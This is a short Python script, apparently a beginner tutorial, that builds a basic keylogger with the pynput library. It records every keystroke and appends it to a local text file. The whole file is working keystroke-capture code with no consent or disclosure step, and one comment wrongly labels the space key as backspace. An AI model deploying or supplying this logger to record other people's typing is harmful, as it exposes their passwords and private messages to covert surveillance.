# DO a $ pip install pynput --external Module

#Creating a Basic  Keylogger.

from pynput.keyboard import Key, Listener

def log_keystroke(key):
    key = str(key).replace("'", "") #convert the key into a string and remove all the single quotes.

    if key == 'Key.space':
        key = ' '  #Give a Backspace
    if key == "Key.enter":
        key = '\n' #New line on Enter

    with open("Generated_Logs.txt", 'a') as f:
        f.write(key) #Write logs to a text file

with Listener(on_press=log_keystroke) as l1:
    l1.join()





